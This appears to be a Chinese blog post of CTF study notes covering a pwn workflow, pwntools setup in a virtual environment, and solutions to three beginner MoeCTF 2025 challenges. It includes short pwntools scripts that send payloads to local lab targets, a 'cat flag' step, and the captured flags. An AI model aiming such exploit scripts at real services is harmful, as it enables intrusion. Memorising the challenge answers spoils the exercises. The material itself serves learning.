---
title: day7
published: 2025-10-22
description: "一些题目+ ZAP工具的使用 + SQL 相关wn 入门指北,Pwn 环境配置"
tags: ["ctf", "pwn", "python"]
category: ctf
draft: false
---

# Pwn的标准流程:
 + 1. checkesc 检查保护机制
 + 2. patchelf 替换libc, ld ...[option]
 + 3. 使用IDA等反汇编反编译挖掘漏洞
 + 4. 用GDB + pwntools 执行确认漏洞
 + 5. 使用Python + pwntools 编写利用脚本

#### note: 
 - libc & ld 分别是 Linux C 标准库和动态链接器。我们⽤ C 语⾔编写程序时经常调⽤⼀
些“从天⽽降”的函数（
printf、
scanf...），它们其实就在 libc（通常为 GNU 提供的 
glibc）⾥，ld 则搭起你的程序和这些函数间的“桥梁”。（详⻅下⽂“编译与汇编”）
Linux 系统中⼏乎所有软件都需要⽤到它们！

# 配置pwntools
## 使用环境为: WSL2-Ubuntu
由于在Liunx下是pip全局安装，会污染系统python环境,所以不被允许，故需要创建虚拟环境

#### 创建虚拟环境和pwntool

```bash
# 如果没有安装对应的软件包
sudo apt update
sudo apt install python3-full python3-venv

# 创建一个用于pwn的虚拟环境
python3 -m venv ~/pwn-venv

# 激活虚拟环境
source ~/PATH/.../pwn-venv/bin/activate
. ~/PATH/.../pwn-venv/bin/activate        # 另一种写法

# 看到命令行将会存在(pwn-venv)，表示已经在虚拟环境中

# 安装pwntools

pip install pwntools
```
##### 设置快捷方式， 方便以后使用

```bash
# 将以下内容添加到 ~/.bashrc 文件末尾
echo 'alias pwn-env="source ~/PATH.../pwn-venv/bin/activate"' >> ~/.bashrc
# 重新加载配置
source ~/.bashrc

```

在之后的使用只需要运行
```bash
pwn-env
```
就可以进入虚拟环境

# 测试题目
## MoeCTF 题目 [0 二进制漏洞审计入门指北](https://ctf.xidian.edu.cn/training/22?challenge=855&tab=terminal)
### 标签: MeoCtf2025 Pwn
在启动题目给的靶机地址后，创建以下python脚本

```python
from pwn import *                                    # 导入 pwntools。
context(arch='amd64', os='linux', log_level='debug') # 一些基本的配置。
context.log_level = 'debug'
# 有时我们需要在本地调试运行程序，需要配置 context.terminal。详见入门指北。

# io = process('./pwn')             # 在本地运行程序。
# gdb.attach(io)                    # 启动 GDB
io = connect("127.0.0.1", 42065)    # 与在线环境交互, 这里连接的是对应靶机地址和端口
io.sendline(b'114511')             
payload  = p32(0xdeadbeef)          # 4字节小端序
                                    
payload += b'shuijiangui'           # strcmp
io.sendafter(b'password.', payload) # 发送！通过所有的检查。
io.interactive()                    # 手动接收 flag。
```

运行该脚本即可获取flag ： moectf{tH3_BegINNiNG-0F-ForM4t2c964a9fe}

## MoeCTF 题目 [1 ez_u64](https://ctf.xidian.edu.cn/training/22?challenge=872)
本题目要求 使用pwntools中的u64,p64,u32,p32将特定大小的字节流与整数相互转换。

### 概念：小端序&大端序
端序（**Endianness**）指的是字节在内存中的存储顺序，主要分为小端序和大端序两种。
 + 小端序: 地位字节存储在低位地址 特点：
   - 最低有效字节在最前面
   - Intel x86/x64 架构使用小端序
   - 目前主流架构
 + 大端序 高位字节存储在低地址 特点:
   - 高位字节存储在低地址
   - 网络字节序通常使用大端序

小端序：像写数字一样，从右往左（低位在前）
```python
# 数字: 12345678
# 小端序: 78 56 34 12 （从个位开始）
```

大端序：像读数字一样，从左往右（高位在前）
```python
# 数字: 12345678  
# 大端序: 12 34 56 78 （从高位开始）
```

而在pwntools中，p64(), p32(), u64(), u32() 是用于处理字节序和数据打包/解包的重要函数。
功能说明:
  + p64/p32: 将整数打包为64位/32位小端序字节串
  + u64/u32: 将64位/32位小端序字节串解包为整数

所以编写攻击脚本
```python

#!/usr/bin/env python3
from pwn import * # type: ignore

context(os='linux', arch='amd64', log_level='debug')

# 替换为实际的远程地址和端口
p = remote('127.0.0.1', 34887)  # 例如：remote('127.0.0.1', 9999)

def itob(x):
    return str(x).encode()

p.recvuntil('hint.')       # 持续接受数据直到接收到字符串hint.
code = p.recv(8)           # 接受关键数据 精确接受八个字节的数据
ans = u64(code)            # 小端序转换
log.debug("Received value: {}".format(ans)) # 在调试模式下打印接收到的整数值
p.sendline(itob(ans))        # 将发送数据并在末尾添加换行符\n 

p.interactive()              # 获得shell 权限

```

然后成功进入交互模式
```bash
cat flag
```

获得: moectf{U53ful_THIng5-1N-PwNTOO1S2440fd8e}

#### note 字符串 vs 字节序列
 + 字符串： 人类可读文本
 + 字节序列： 计算机存储的原始二进制序列

## Moe 题目 [1 find it](https://ctf.xidian.edu.cn/training/22?challenge=919)
### 标签: MoeCTF2025 Pwn
这是一道Pwn题目，要求我们理解什么是fd(**文件描述符**)
#### fd 和 PID的区别
 + PID是进程的全局标识，用于在系统中唯一识别一个进程
 + fd是进程内部的资源句柄，用于访问文件、网络等资源
 + 不同进程可以有相同的fd值，但指向不同的实际资源
 + PID在进程生命周期内不变，fd随文件打开关闭动态变化

题目开头问题:
```txt
I've hidden the fd of stdout. Can you find it?
```
根据Liunx程序的创建机制,初始会将 **stdin** **stdout** **stderr** 分别设为 0 1 2
所以新的stdout 为 **fd 3** 此时 **fd1** 关闭 输入 ./flag 此时由于**fd1**关闭为空所以分配
是输入1即可获得flag ：moectf{fInd_tH3_H1DDen_fd40cbba45f57}

:::important
note: Liunx 分配fd的时候总是会分配最小的未分配数
:::